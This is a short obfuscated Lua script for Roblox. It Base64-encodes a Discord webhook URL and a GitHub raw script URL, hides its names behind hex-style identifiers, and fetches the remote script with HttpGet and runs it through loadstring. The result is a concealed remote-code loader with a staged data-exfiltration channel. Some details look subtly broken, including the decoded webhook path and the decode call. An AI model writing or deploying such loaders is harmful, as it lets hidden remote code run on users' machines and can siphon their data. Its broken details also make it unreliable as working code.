-- Obfuscated Roblox script
local _0x1a2b = "SmFkZXMgaGVyZTEwMg==" -- Base64 encoded "Jades_here102"
local _0x3c4d = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvYmVhcm5zLzEyODMxMzAwODU5NDU5MTc2NS9MLWlCQlNVTExFNjE1V0NkLVI0cTVueW8xNW5LRUpRZzJ2aTdHSDJzM1lHMlVldERlVFV1X1BUVGxIZ0E=" -- Base64 encoded WebHook URL
local _0x5e6f = "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9sb2NhbHktYWN0aXZlL3Byb2plY3RzL21haW4vb3RoZXIv" -- Base64 encoded script URL

-- Decode Base64 strings
local function _0x7d8e(_0x8f9a)
    local _0xa1b2 = game:GetService("HttpService"):DecodeBase64(_0x8f9a)
    return _0xa1b2
end

-- Fetch and execute the script
local function _0x9a8b(_0xc9d0)
    local _0x0b1c = game:HttpGet(_0xc9d0)
    loadstring(_0x0b1c)()
end

-- Use the functions
local _0x3d4e = _0x7d8e(_0x5e6f)
_0x9a8b(_0x3d4e)
